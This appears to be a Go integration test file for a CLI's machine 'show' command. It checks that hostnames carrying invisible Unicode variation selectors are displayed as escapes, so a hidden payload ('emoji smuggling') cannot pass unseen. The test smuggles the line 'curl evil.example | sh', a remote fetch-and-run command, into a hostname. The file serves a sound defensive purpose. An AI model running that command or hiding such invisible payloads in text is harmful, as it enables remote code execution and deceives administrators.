//go:build integration

package machine

import (
	"fmt"
	"strings"
	"testing"
	"time"
	"unicode"

	"github.com/airbnb/rudolph/internal/testutil/clitest"
	"github.com/airbnb/rudolph/internal/testutil/ddblocal"
)

// selectorBytes spells b in variation selectors, one per byte (U+FE00-FE0F for 0-15, U+E0100-E01EF for 16-255), and
// returns the string together with the escapes the CLI should show for it.
func selectorBytes(b string) (raw, escapes string) {
	var r, e strings.Builder
	for i := 0; i < len(b); i++ {
		c := rune(b[i])
		sel := 0xfe00 + c
		if c >= 16 {
			sel = 0xe0100 + c - 16
		}
		r.WriteRune(sel)
		if sel > 0xffff {
			fmt.Fprintf(&e, `\U%08x`, sel)
		} else {
			fmt.Fprintf(&e, `\u%04x`, sel)
		}
	}
	return r.String(), e.String()
}

// Variation selectors render as nothing, so a host name can carry a whole hidden message after one visible letter
// ("emoji smuggling") and look like an ordinary name to the admin. The CLI shows them as escapes; only the emoji
// presentation selector U+FE0F stays, as emoji need it (owner approved, 2026-11-19).
func TestMachineShow_EscapesVariationSelectorPayloadInHostname(t *testing.T) {
	ddblocal.Reset(t)
	payload, escapes := selectorBytes("curl evil.example | sh\x02")
	text := string(rune(0xfe0e))
	host := "lab-mac-" + "7" + payload + " " + "7" + text
	seedMac(t, macA, host, "C02ABC123", time.Now())

	out, err := clitest.Run(t, env(), MachineCmd, "", "show", "-m", macA)
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	for i, r := range out {
		if unicode.Is(unicode.Variation_Selector, r) {
			t.Errorf("output has raw selector %U at byte %d:\n%+q", r, i, out)
			break
		}
	}
	mustContain(t, out, "lab-mac-7"+escapes+` 7\ufe0e`)
}

// A heart with the emoji presentation selector, and a keycap, are shown as they are.
func TestMachineShow_KeepsEmojiPresentationSelector(t *testing.T) {
	ddblocal.Reset(t)
	host := "Kim" + string([]rune{0x2764, 0xfe0f}) + " mac " + string([]rune{'1', 0xfe0f, 0x20e3})
	seedMac(t, macA, host, "C02ABC123", time.Now())
	out, err := clitest.Run(t, env(), MachineCmd, "", "show", "-m", macA)
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	mustContain(t, out, host)
}
